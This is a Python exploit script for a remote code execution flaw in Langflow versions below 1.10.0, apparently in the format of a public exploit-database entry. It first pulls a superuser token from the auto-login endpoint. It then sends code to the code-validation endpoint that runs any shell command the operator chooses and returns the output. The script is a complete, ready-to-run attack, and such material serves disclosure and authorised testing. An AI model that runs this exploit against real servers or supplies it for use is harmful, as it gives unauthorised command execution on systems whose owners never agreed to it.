# Exploit Title:  Langflow 1.10.0 - RCE
# Exploit Author: Richard Howe <rhowe425>
# Vendor Homepage: https://www.langflow.org/
# Software Link: https://www.langflow.org/desktop
# Version: < 1.10.0
# Tested on: Ubuntu 22.04
# CVE : CVE-2026-9198

import argparse
from requests import get, post


def stage1(base_url: str) -> str:
    endpoint = '/api/v1/auto_login'
    headers = {
        'Content-Type': 'application/json',
    }

    try:
        resp = get(base_url + endpoint)
    except Exception as e:
        raise RuntimeError(f"Error querying API.\n{str(e)}")

    if resp.status_code == 200:
        resp_json = resp.json()
        return resp_json['access_token']
    else:
        raise RuntimeError(f"API returned with status code: {resp.status_code}")


def stage2(base_url:str, token: str, cmd: str):
    endpoint = '/api/v1/validate/code'
    headers = {'Authorization': f'Bearer {token}'}
    data = {"code":"\ndef exploit(\n    _=( lambda r: (_ for _ in ()).throw(Exception(f\"{r.stdout}{r.stderr}\")) )(\n        __import__('subprocess').run('%s', shell=True, capture_output=True, text=True)\n    )\n):\n    pass\n" % cmd}

    try:
        resp = post(base_url + endpoint, headers=headers, json=data)
    except Exception as e:
        raise RuntimeError(f"Error querying API.\n{str(e)}")

    if resp.status_code == 200:
        resp_json = resp.json()
        print(resp_json)
    else:
        raise RuntimeError(f"API returned with status code: {resp.status_code}")


def main():
    parser = argparse.ArgumentParser(description="Exploit for Langflow RCE CVE-2026-9198")
    parser.add_argument('-u', '--url', required=True, help="Target url. e.g. http://127.0.0.1:7860")
    parser.add_argument('-c', '--command', required=True, help="Bash command to execute.")
    args = parser.parse_args()

    # Retrieve SUPERUSER token
    token = stage1(base_url=args.url)

    # Leverage SUPERUSER token to execute arbitrary code
    stage2(base_url=args.url, token=token, cmd=args.command)


main()